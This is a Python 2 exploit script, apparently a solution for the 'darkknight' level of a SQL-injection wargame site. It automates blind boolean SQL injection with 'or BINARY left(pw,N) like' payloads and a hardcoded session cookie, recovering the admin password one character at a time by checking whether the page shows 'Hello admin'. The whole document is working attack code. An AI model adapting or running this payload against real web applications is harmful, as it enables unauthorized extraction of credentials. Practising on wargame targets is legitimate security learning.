import httplib
import urllib
import sys

result = ""
conn = httplib.HTTPConnection("los.eagle-jump.org")
headers = {'Cookie':'PHPSESSID=ego8siuahvo2a7i0ml56fk94k0','Content-Type':'application/x-www-form-urlencoded'}

for y in range(1,20):
	print y,
	print ':',
	for x in range(48,127):
		urladdr = urllib.quote(" or BINARY left(pw,"+str(y)+") like \""+result+chr(x)+"\" && id like \"admin\" -- ")
		
		conn.request("GET","/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=0"+urladdr,'',headers)
		response = conn.getresponse()
		data = str(response.read())

		if (data.find("Hello admin") != -1):
			result = result + chr(x)
			print result
			break

		if(x == 126):
			print "Query end"
			sys.exit(1)

print result
conn.close()